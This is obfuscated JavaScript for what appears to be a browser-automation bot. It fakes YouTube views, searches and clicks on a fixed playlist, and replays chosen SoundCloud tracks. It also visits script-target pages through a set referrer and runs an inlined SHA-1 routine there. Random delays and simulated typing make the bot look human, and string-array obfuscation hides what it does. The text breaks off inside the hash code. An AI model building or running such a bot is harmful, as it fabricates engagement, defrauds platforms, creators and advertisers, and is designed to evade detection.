function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1b09 + -0x13b1 + 0x2eba);
    let h = e[f];
    return h;
  }, d(b, c);
}
const a0 = b,
  Z = c,
  Y = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x15e7 + 0x772 + -0x1d58))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xb * 0x2e5 + -0x1 * 0x1c13 + 0xf1 * -0x4), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1 * 0x64d5 + -0x7463 + 0xa36 * 0xd + (-0x3e * -0xa1 + -0x3b94 + -0x7eb * -0xa) * random()) : await standardWaitForNetIdle(f), await wait(0x757 * -0x1 + 0x6 * -0xca + 0x1f9b + (0xb3a + -0x32de + 0xc * 0x68f) * random()), 0x2166 + 0x30 + -0x2195;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1f8c + 0x1 * -0x1721 + 0x9d * 0x79), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1ab4 + -0x18bc + 0x3371;
}
async function randomWait() {
  return await wait(0x1 * 0x21f1 + -0x1d50 + 0xee7 + (-0xf3d + -0x2 * 0x298 + 0x27f5) * random()), -0x7dd * 0x4 + 0x5 * -0x6f3 + -0x13 * -0x37c;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array[R(0x1d)](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0xad9 * -0x1 + 0x702 + -0x11db, 0x7 * 0x481 + -0x4 * 0x279 + -0x159c), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x34ce * -0x1 + 0x208a * 0xa + -0x2636) * getRandomInt(-0x6d4 + 0x85 * -0x18 + 0x134e * 0x1, -0x19b6 * -0x1 + -0x15 * 0x1d3 + -0x143 * -0xa), h)), -0xd4d + 0x200d + -0x12bf;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x26ce + -0x45b + 0x2273 * -0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1 * 0x1046 + 0x1e49 + 0xa3 * -0x16]['split']('\x20');
    for (let k = -0x1e04 + 0xd18 + -0xc * -0x169; k < i['length']; k += -0x2cd + -0x1455 + 0x1724)
      j += i[k] * h[i[k + (0x47a + -0xd1 * -0x13 + -0x13fc)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1086 + -0xc83 + -0x1d0f * -0x1)['map'](l => Array['from'](l['children']))['flat'](-0x7b0 + -0x1cdc + 0x248d)['map'](l => l['childNodes'][0x33b + 0x2339 + -0x2673]['childNodes'][-0x4d3 + -0x58 * -0x4c + -0x154d]['childNodes'][0x10 * 0xd8 + -0xc5a + 0x1 * -0x125]['childNodes'][-0x6 * 0x4d5 + 0x179f + -0x5 * -0x113]['childNodes'][-0x9ea + -0xc34 + 0x161f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x12 * -0xca + 0x1 * -0x16a9 + 0x1f1 * 0x15, 0x362 * 0x1 + -0xe89 + 0x5 * 0x623)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x453c + -0x20d + 0x81e1);
  const h = await getMaxTime(f),
    i = Math['min']((0x15691 * 0x1 + 0x13485 * -0x1 + 0xc854) * getRandomInt(0x1 * -0x169 + 0xdeb * -0x1 + 0x1a * 0x97, -0x1f01 * -0x1 + -0x1603 + 0x8f9 * -0x1), h);
  return await wait(i), 0x9b7 + 0x6d1 + -0x1087;
}

function a() {
  const bo = [
    'zwfZEwzVCMSUBW',
    'xbrDZAFf3Q',
    'C3vKAxbHCNLHBa',
    'f8oPW4KM',
    'WRqBFeVdO8oCvSkwWQhdRq',
    'pts/444523',
    'W43cOx0nEG',
    'syn_52523/',
    'catch',
    'W743fW/cI8kggSoCW6hdPq',
    'lgj0CYbQDw5NAW',
    '-anti-anti',
    'EwzWvKWYz190AW',
    'ChrZl2j5lxnPDa',
    'BI94AhrTBcT4Bq',
    'com/@watch',
    'WPHgd8kgWReMtCkXW7i6',
    'ttvgCJHhmg1Hoq',
    'ywnRlxnOyxbLia',
    'BgvxzwjlAxqVnq',
    'Ahr0Chm6lY93DW',
    'CMCVC2nYAxb0CW',
    'hex',
    't\x20story,mi',
    'WRVdQs7dRfVdLmoTWQtcKCka',
    'fGuuaY8dW4ftyCo4',
    'WRddLHBcOmoYxWPEWOG',
    'zxzHBhvHDgu',
    'yw5IzwfZDgX5lq',
    'zNjVBq',
    '\x20Chrome/10',
    'W5OrCejGW6/cSJbDoq',
    'https://me',
    'pts/by-sit',
    'k-more',
    'wg8WuJHxAvjtyG'
  ];
  a = function() {
    return bo;
  };
  return a();
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x387 * 0x1 + -0x128c + 0x1 * 0x1613]['children'][-0x10 * 0x1e8 + -0x1790 + -0x1b08 * -0x2]['children'][0x1d97 + 0x44b * 0x6 + -0x3759]['children'][0x26f1 * -0x1 + 0x1f * 0x33 + 0x20c4]['children'][0x1 * -0x21ec + -0x12a * 0x1d + 0x43ae * 0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x31 * 0x16 + 0xa4d + 0x4d6 * -0x3;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1b09 + -0x13b1 + 0x2eba);
    let h = e[f];
    if (b['ycacDb'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xc43 + -0x2204 + -0x21 * -0x167, s, t, u = 0x192 + 0x1086 + -0x1218; t = n['charAt'](u++); ~t && (s = r % (0x1 * 0x261d + 0xcce + -0x32e7) ? s * (-0xd18 + 0xb * 0x2e5 + -0x1 * 0x127f) + t : t, r++ % (-0x4 * -0x269 + 0x1 * 0x18d9 + -0x2279)) ? p += String['fromCharCode'](-0x295 * -0x3 + -0xf * -0x1bb + -0x20b5 & s >> (-(0x250 + -0x14ee + 0x254 * 0x8) * r & 0x135f + -0x1d2 * -0x8 + -0x21e9)) : 0x1ff * -0x5 + -0x856 * -0x2 + -0x6b1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1fcd + -0x1f8c + 0x1 * 0x3f59, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x134 + 0x151f + -0x1643))['slice'](-(-0x115b * 0x2 + 0x16 * -0x186 + 0x443c));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x2e6 + -0xf3d + -0x1 * -0x1223,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xa2 + -0x7dd * 0x4 + 0x25 * 0xde; u < 0xb * 0x193 + -0x1af * 0x6 + -0x637; u++) {
          p[u] = u;
        }
        for (u = -0xf6c + 0x7 * 0x481 + -0x13 * 0xd9; u < 0x76d * -0x1 + 0x7 * -0xa1 + -0x1 * -0xcd4; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x6d4 + 0x85 * -0x18 + 0x144c * 0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x19b6 * -0x1 + -0x15 * 0x1d3 + -0x285 * -0x5, q = -0xd4d + 0x200d + -0x12c0;
        for (let v = 0x26ce + -0x45b + 0x2273 * -0x1; v < n['length']; v++) {
          u = (u + (-0x1 * 0x1046 + 0x1e49 + 0xa3 * -0x16)) % (-0x1e04 + 0xd18 + -0x1f * -0x94), q = (q + p[u]) % (-0x2cd + -0x1455 + 0x1822), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x47a + -0xd1 * -0x13 + -0x12fd)]);
        }
        return t;
      };
      b['RkGmTh'] = m, c = arguments, b['ycacDb'] = !![];
    }
    const j = e[-0x1086 + -0xc83 + -0x1d09 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['aybIYO'] === undefined && (b['aybIYO'] = !![]), h = b['RkGmTh'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x31c * -0x7 + -0x16e2 + 0x1 * 0x182 + (-0x2 * 0x8e1 + -0x24b9 + -0x36ad * -0x1) * random()
  }), await wait(-0x107e * 0x1 + -0x1f5d + 0x31cf + (0x24c0 + 0x1 * -0x259b + 0x207) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0xae * -0x13 + 0x687 * -0x5 + 0x13bb]['childNodes'][-0x2a * -0x1b + -0x5 * 0x622 + 0x1 * 0x1a3d]['childNodes'][0x26 * -0x101 + -0x1 * 0x1d + 0x2644]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x2099 + -0x511 * 0x7 + 0x2e3 * 0x1]['childNodes'][-0xa9 * 0x8 + -0x841 * -0x3 + -0x137b * 0x1]['childNodes'][0x1 * 0x9f7 + -0x1 * -0x1fa5 + -0x852 * 0x5]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const S = b;
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))[S(0x3, 'aN$g')](0xbb * 0x7 + 0x9ad * -0x1 + -0xa7 * -0x7),
          r = 0x2527 * 0x1 + 0xcb * -0x6 + -0x2065;
        for (let u = -0x246b + -0x1478 + 0x38e3; u < q['length']; u += -0x922 * -0x4 + -0x1 * 0xe7d + -0x1609)
          r += q[u] * k[q[u + (-0x3 * 0x9c7 + 0x3f1 * -0x1 + 0x4c1 * 0x7)]];
        return r;
      }(n);
  });
  await wait((0x4c1 * -0x1 + -0x19b8 + 0x5911) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x2d11 * -0x2 + -0x9545 + -0x1d9c7 * -0x1) * getRandomInt(-0x1 * 0x1f2a + 0x1079 * 0x2 + -0x1c7, 0x265a * -0x1 + -0xf2e * 0x1 + 0x3592), h + (-0x2 * -0x557 + 0x1af3 + -0x1219));
  return await wait(i), 0x89 * -0xa + -0x1f13 + 0x246e;
}
async function keyWatch(f) {
  const T = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1f54 + 0x1f * -0x63 + -0x1357), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + T(0x12) + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1236 + -0xa3 * -0x8 + -0xb96 + (-0x1ee3 + -0x47f * -0x1 + 0x1e4c) * Math['random']());
    });
  }, 0x2 * -0x8bd + -0x7c * 0x44 + -0x1 * -0x4dc2);
  await wait(-0x7dd5 + 0x2065a + 0x30b5b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x229f * -0x5 + -0x16350 + 0x1a095) * getRandomInt(-0x81f + -0x1c3c + 0x245f, -0x1483 + -0xd * 0x240 + 0x31dc)), clearInterval(h), 0x1784 + -0x3 * 0x902 + 0x383;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1b09 + -0x13b1 + 0x2eba);
    let h = e[f];
    if (c['wdzFiv'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xc43 + -0x2204 + -0x21 * -0x167, r, s, t = 0x192 + 0x1086 + -0x1218; s = m['charAt'](t++); ~s && (r = q % (0x1 * 0x261d + 0xcce + -0x32e7) ? r * (-0xd18 + 0xb * 0x2e5 + -0x1 * 0x127f) + s : s, q++ % (-0x4 * -0x269 + 0x1 * 0x18d9 + -0x2279)) ? o += String['fromCharCode'](-0x295 * -0x3 + -0xf * -0x1bb + -0x20b5 & r >> (-(0x250 + -0x14ee + 0x254 * 0x8) * q & 0x135f + -0x1d2 * -0x8 + -0x21e9)) : 0x1ff * -0x5 + -0x856 * -0x2 + -0x6b1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1fcd + -0x1f8c + 0x1 * 0x3f59, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x134 + 0x151f + -0x1643))['slice'](-(-0x115b * 0x2 + 0x16 * -0x186 + 0x443c));
        }
        return decodeURIComponent(p);
      };
      c['vyqbfD'] = i, b = arguments, c['wdzFiv'] = !![];
    }
    const j = e[-0x2e6 + -0xf3d + -0x1 * -0x1223],
      k = f + j,
      l = b[k];
    return !l ? (h = c['vyqbfD'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1ec8 + -0x326 + 0x21ee;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x775 * 0x5 + 0x1b41 * -0x1 + -0xa07;
    await randomWait();
  }
  return 0x5 * 0x1e9 + -0xc31 * 0x2 + 0xed6;
}

function fetchRandomSC() {
  const V = b,
    U = c;
  return Math['random']() <= 0xb2 * 0x30 + -0xebe + -0x12a2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1c13 + -0xa * -0x2da + -0xb * 0x525 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + U(0x1c) + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + V(0x19, '9EG9') + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1d7 * 0x3 + 0xd87 + -0x130c + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x10be + 0x43a + -0x59 * -0x24;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x5cad + -0x2 * 0x4f3b + 0x1aaeb + getRandomInt(-0x665f + -0x7a4 + 0x1 * 0xa89b, 0x4f8c * -0x1 + 0xae18 + -0xe * -0x19e));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x4 * 0x59 + -0x7f + -0x4 * -0x79), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1877 + -0x19c1 * -0x1 + -0x3238;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1f1d + 0x22 * -0x34 + -0x1 * 0x1835, 0x187f * -0x1 + 0x8 * 0x314 + 0x11 * 0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1c65 + -0xb10 + -0x985 + floor((0x2 * 0xdf6 + -0x139 * 0x9 + -0xd03) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x7a775bfc + 0x3c0ebc6c * -0x1 + 0x136861868),
          -0x1 * -0x1f1f45 + -0x512e * 0x23b + -0x9ef * -0x1bfb,
          0x2e92 * 0x1 + 0x3 * -0x186e + 0x9ab8,
          -0x1147 * -0x2 + 0x10df + -0x32ed
        ], y = [
          -0xfb2 + -0x23f3 + 0x33bd,
          0x442 + -0xd4b + 0x919 * 0x1,
          0xc0b + -0x290 * -0x1 + 0x5b * -0x29,
          0x10c8 + -0x2621 + 0x1559
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x7 * -0xb + -0x7 * -0x17 + -0x53)['update'](K)[J]();
          };
        }, C = function() {
          const W = d;
          var J, K, L = B(W(0x16));
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x6fe * 0x2 + -0x4cb + 0x12c7; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1bfd + -0x3cb * 0x1 + -0x388 * -0x9) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * -0x1462 + 0x1 * -0xd01 + -0xe7 * -0x25] = A[-0x3b * -0x65 + 0x1 * 0x2704 + -0x3e3b] = A[0x150f + -0x2144 + 0xc36] = A[-0xf1b + -0xaac * 0x1 + -0xa1 * -0x29] = A[0x242d + -0xe38 + -0x15f2] = A[0x52 * 0x7 + -0x2 * -0xd6c + -0x1d12] = A[0x181 * -0x13 + 0x1165 + 0xb33] = A[0x208d + 0x1de4 + 0x227 * -0x1d] = A[0xc65 + -0xc1 + -0xb9d] = A[0x46 * 0x3c + 0x1408 + -0x2468] = A[-0x227b + -0x1739 * 0x1 + 0x39bd] = A[-0x409 + -0x425 * 0x5 + 0x18cc] = A[-0x1005 + -0x2571 + 0x3581] = A[-0x11 * -0x107 + -0x1331 + -0x1 * -0x1c6] = A[0x11e8 + 0x708 + -0x115 * 0x17] = A[0x2 * -0x269 + 0x1c10 + -0x1730] = A[-0x21b8 * 0x1 + 0x21fe + -0x37] = -0xac + 0x1 * -0xb47 + 0xbf3, this['blocks'] = A) : this['blocks'] = [
                0x243c + -0x251 * 0xd + -0x1 * 0x61f,
                -0x21f2 + 0x25fc + -0x40a,
                0x1e13 + -0x4e7 + -0x192c,
                -0x335 * -0x8 + 0x4 * -0x58 + -0x1848,
                -0xc2 * -0x2e + 0x2395 + 0x3 * -0x177b,
                -0x3ae * 0x3 + -0x1 * -0x14c9 + -0x5 * 0x1f3,
                0x107 * 0x15 + 0x2679 + -0x3c0c,
                -0x533 + 0x17e * -0x6 + -0x1 * -0xe27,
                0x1245 * 0x1 + 0x233 * 0x8 + -0x23dd,
                0x2f * -0xc1 + 0xcbc + 0x16b3,
                0x1ec + -0xd86 + -0x1ef * -0x6,
                -0xf67 + 0x3 * 0x9ff + -0xe96,
                0x202c + 0x1956 + -0x3982,
                -0x3 * 0x10d + 0x86f * -0x2 + -0x5 * -0x401,
                0xd6c + 0x31 * 0x9d + -0x167 * 0x1f,
                -0x1 * 0x6fa + 0x1 * -0x2427 + 0x2b21,
                -0x68c + -0x7a7 + -0xe33 * -0x1
              ], this['h0'] = -0x6905b213 + 0x4031e5e + 0x31f2ba * 0x417, this['h1'] = 0x11c * 0x1a55335 + 0x714f33ab + -0x154e9d6ee, this['h2'] = -0x1c0c09ac + 0x82d69fbe + 0x31f046ec, this['h3'] = 0x2 * -0xb13574 + -0x944dad + 0x12290d0b, this['h4'] = -0x26ac7821 + -0x387fd24 * 0x3b + 0x1bad6b15d, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1 * -0x1dc1 + 0x264d + -0x88c, this['finalized'] = this['hashed'] = 0x7f * -0x47 + -0xde4 * -0x1 + 0x1555, this['first'] = 0x1e7 + -0x1efd * 0x1 + -0xb * -0x2a5;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x2 * -0x12d0 + 0x2 * 0x65e + -0x213 * -0xc, O = J['length'] || 0x7 * -0x55d + -0x3b9 * -0x3 + 0xd30 * 0x2, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * -0x71 + -0x1f68 + 0x1ef7, P[-0x657 * 0x1 + 0x1 * 0x1ef7 + -0x18a0] = this['block'], P[0x1267 * -0x1 + 0x65 * -0x30 + 0x2567] = P[-0x7a7 * -0x2 + -0x22d6 + -0x1389 * -0x1] = P[0x1fd9 + -0xd9d + -0x123a] = P[-0x1 * -0x157a + -0x22de + 0xd67] = P[0x7a * 0x37 + -0x253 * -0xb + -0x1 * 0x33c3] = P[-0x2 * -0x38a + 0x571 + 0x1 * -0xc80] = P[0x1511 * 0x1 + -0x7f1 + -0x56 * 0x27] = P[-0xd2c + -0x1e13 + 0x15a3 * 0x2] = P[-0x18b6 * 0x1 + 0x1ef5 + -0x637] = P[0x16ba + -0x1452 + -0x25f] = P[0xeef + -0x34d + -0xb98] = P[0x4dd + 0xde * -0xb + 0x4b8] = P[0x2170 + -0x1ce4 + -0x480] = P[-0x128a + 0x2f + 0x934 * 0x2] = P[-0xcb3 + 0x6b * 0x31 + -0x2b * 0x2e] = P[0x1 * 0x93d + 0x186c + -0x219a] = -0x97 * -0x1d + 0x5 * 0x621 + -0x2fc0), K) {
                    for (N = this['start']; M < O && N < 0x1ba + 0x4f9 + 0x673 * -0x1; ++M)
                      P[N >> -0x194e + 0x907 + 0x1049 * 0x1] |= J[M] << y[-0x23ac + 0x2fe * -0xb + 0x4499 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x1 * 0x53 + -0xf4 * 0x2 + 0x1d5; ++M)
                      (L = J['charCodeAt'](M)) < -0x131 * -0xd + -0x5ae * -0x1 + -0x14ab ? P[N >> 0x304 + 0x5 * 0x25c + -0xa * 0x17b] |= L << y[0x26b5 + 0xd8f + 0x5b * -0x93 & N++] : L < -0x1f85 + 0x1c09 + 0xb7c ? (P[N >> -0x2 * -0xc5e + 0x1 * -0xeb7 + -0xa03] |= (-0x3 * -0xc73 + -0xbb4 + -0x18e5 * 0x1 | L >> 0x35 * -0x8a + -0x1 * 0x8fb + 0x2593) << y[0x1506 + -0x24e5 + 0x2 * 0x7f1 & N++], P[N >> 0x7f4 + -0xf7a * -0x1 + -0x4 * 0x5db] |= (-0x160a + 0x129 * -0x12 + 0x2 * 0x15b6 | 0x1c59 + -0x1584 + 0x3 * -0x232 & L) << y[-0x2 * -0xe68 + 0xa65 + -0x2732 & N++]) : L < -0x5d17 * 0x1 + -0x1069d + 0x28d6 * 0xe || L >= -0x133da + 0x9e * 0x24d + -0x2 * -0x542a ? (P[N >> -0x4 * -0x774 + -0x14da * -0x1 + -0x32a8] |= (0x1 * -0x185 + -0x160d + 0x1872 | L >> 0x23b5 + -0x23ff + 0x56) << y[0xbf7 * 0x2 + 0x12d8 + -0x2ac3 & N++], P[N >> -0x3b * 0x2 + -0x1 * -0x209 + 0x191 * -0x1] |= (-0x13cf * -0x1 + 0x557 + -0x18a6 | L >> -0x21 * 0x3 + -0x144a + 0x14b3 & -0x2b * 0x20 + 0x31 * -0x8b + 0x203a) << y[0x1 * -0x19c4 + -0x1 * 0x236b + 0x8be * 0x7 & N++], P[N >> 0x15a * -0x14 + -0x1 * 0x1669 + 0x3173] |= (0x1e4 + 0x1 * 0x1df8 + 0x3 * -0xa74 | -0xcdd * -0x1 + 0x2dd + -0xf7b & L) << y[0x1c79 * -0x1 + 0x1775 * 0x1 + -0x1ad * -0x3 & N++]) : (L = -0x2 * 0x2b06 + -0x51a3 * 0x2 + 0x71e * 0x47 + ((-0x10cc + 0xfd6 + 0x4f5 & L) << 0x2 * -0x12b5 + -0xf14 + -0x148 * -0x29 | 0x7fb + -0x89 * 0x5 + -0x5 * 0x43 & J['charCodeAt'](++M)), P[N >> 0x1db2 + 0x22e0 + -0x4090] |= 